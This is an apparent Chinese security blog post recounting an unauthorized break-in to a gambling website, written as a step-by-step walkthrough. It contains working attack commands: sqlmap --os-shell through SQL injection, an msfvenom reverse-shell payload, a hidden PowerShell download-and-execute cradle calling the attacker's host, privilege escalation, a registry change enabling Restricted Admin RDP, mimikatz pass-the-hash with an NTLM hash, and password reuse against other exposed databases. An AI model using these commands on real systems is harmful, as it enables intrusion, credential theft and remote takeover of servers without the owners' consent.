## 弱口令  

闲着无聊，网上找了一个菠菜进行简单测试，并做记录，大佬们轻喷。

访问网站就是一个登录页面，试试简单的弱口令，直接进入后台。

![](https://image.3001.net/images/20230504/1683130727_6452896747c60c4a59c08.png!small)

## SQL注入  

翻看了很多功能点，在一处功能点发现上传接口，并尝试上传文件，发现无法上传，加了白名单。直接选择放弃，继续寻找。在某一个url参数上加上单引号，直接报错，SQL注入这不就来了么。

![](https://image.3001.net/images/20230504/1683131282_64528b9241a8f91cfc86e.png!small)说干就干，直接SQLMAP神器。  

![](https://image.3001.net/images/20230504/1683131453_64528c3d94f2f3c9d01b5.png!small)发现为MSSQL，且DBA权限，直接
--os-shell  

![](https://image.3001.net/images/20230504/1683131560_64528ca89646cd0b2bc0c.png!small)  

## 上线MSF  

msf生成powershell脚本，并放置在网站目录下  

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8888 -f
psh-reflection >xx.ps1  
  
---  
  
![](https://image.3001.net/images/20230504/1683131882_64528deab28f6379c8e0a.png!small)vps开启监听  

![](https://image.3001.net/images/20230504/1683131926_64528e16d59c69b0e7c96.png!small)直接powershell上线session  

powershell.exe -nop -w hidden -c "IEX ((new-object
net.webclient).downloadstring('http://x.x.x.x/xx.ps1'))"  
  
---  
  
![](https://image.3001.net/images/20230504/1683132046_64528e8ea1368d08b1f8e.png!small)如果想要通过url拼接堆叠执行powershell会存在一个问题，就是单引号闭合问题。我们可以通过对powershell进行编码一下，这样就可以绕过单引号的问题。下面推荐一个不错的网站  

https://r0yanx.com/tools/java_exec_encode/  
  
---  
  
## 提权  

直接getsystem获取system权限。这里推荐土豆家族提权，实战中成功率很高。  

![](https://image.3001.net/images/20230504/1683132777_6452916906c11cdb39bb0.png!small)迁移一下进程，防止进程掉线。  

![](https://image.3001.net/images/20230504/1683132906_645291ea4902a81f2f8c0.png!small)

## 远程登录服务器  

因为是system权限，且为2012系统，大于2008版本都是无法抓到明文密码，直接修改adminnistrator密码。（实战中不推荐直接修改管理员密码）  

![](https://image.3001.net/images/20230504/1683133024_645292600c0a6090c37d7.png!small)  

![](https://image.3001.net/images/20230504/1683133092_645292a4475dc0e37c74a.png!small)

  

## 通过hash远程登录管理员账号  

因为无法获取明文密码，直接修改管理员密码稍有些不妥。尝试通过获取管理员NTLM远程登录机器。（并非同一台，这只是提供一个思路）  

![](https://image.3001.net/images/20230504/1683133771_6452954b578b5fcb29f0c.png!small)

如果使用hash远程登录RDP，需要开启"Restricted Admin Mode"

REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
/t REG_DWORD /d 00000000 /f //开启Restricted Admin mode  
  
---  
  
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr
"DisableRestrictedAdmin" //

查看是否已开启0x0则表示开启  
  
![](https://image.3001.net/images/20230504/1683133998_6452962e850c83b6941e0.png!small)  

利用mimikatz传递hash进行远程登录  

sekurlsa::pth /user:administrator /domain:x.x.x.x
/ntlm:4c814fa57488c76caa5ceb6e3eb0272e "/run:mstsc.exe /restrictedadmin"  
  
---  
  
![](https://image.3001.net/images/20230504/1683133969_64529611a3a3fc3668cd4.png!small)成功远程管理员桌面  

![](https://image.3001.net/images/20230504/1683134296_64529758067852ba182ff.png!small)

  

## 其他  

前期发现1433端口开放着，寻找数据库配置文件，登录数据库。  

![](https://image.3001.net/images/20230504/1683134634_645298aa9e94908b4779f.png!small)通过fofa找了一下，资产还是挺多的，切很多都开放1433端口，猜测会存在同一个人部署的网站，尝试用获取的密码对这些资产的1433端口进行爆破，成功撞到几台数据库，切都是sa权限。  

![](https://image.3001.net/images/20230504/1683134829_6452996d2ac28ad731241.png!small)  

  

  

